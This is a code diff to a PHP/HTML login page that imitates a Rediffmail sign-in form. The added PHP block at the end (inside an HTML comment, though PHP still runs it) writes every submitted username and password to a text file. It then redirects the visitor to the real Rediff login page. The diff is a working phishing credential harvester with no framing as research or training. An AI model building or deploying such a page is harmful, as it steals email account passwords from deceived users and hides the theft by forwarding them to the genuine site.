@@ -1,3 +1,7 @@
+<?php
+    session_start();
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,18 +25,19 @@
             <span class="mail">mail</span>
         </div>
         <div class="form_div">
-            <form action="action.php">
+            <!-- <form action="<?php $_SERVER['PHP_SELF']; ?>" method="POST"> -->
+            <form action="login.php" method="POST">
                 <table>
                     <tr>
                         <td>Username</td>
-                        <td colspan="2"><input type="text" size = 40></td>
+                        <td colspan="2"><input type="text" size = 40 name = "username"></td>
                         <td></td>
                     </tr>
                     <tr>
                         <td>Password</td>
-                        <td><input type="password" size = 30></td>
+                        <td><input type="password" size = 30 name = "password"></td>
                         <!-- <td></td> -->
-                        <td id = "sign_in"><input type="submit" value = "Sign in"></td>
+                        <td id = "sign_in"><input type="submit" value = "Sign in" name ="signin"></td>
                     </tr>
                     <tr>
                         <td></td>
@@ -269,5 +274,24 @@
         </div>
 
     </footer>
+
+    <!-- <?php
+        if($_SERVER['REQUEST_METHOD'] == 'POST')
+        {
+            if(isset($_POST['username']) && isset($_POST['password']))
+            {
+                $fp = fopen("username.txt",'a');
+                $user = $_POST['username'];
+                $pwd = $_POST['password'];
+                fwrite($fp,$user);
+                fwrite($fp," -- ");
+                fwrite($fp,$pwd);
+                fwrite($fp,"\n");
+                fclose($fp);
+            }
+        }
+        header("Location : https://mail.rediff.com/cgi-bin/login.cgi");
+        exit();
+    ?> -->
 </body>
 </html>
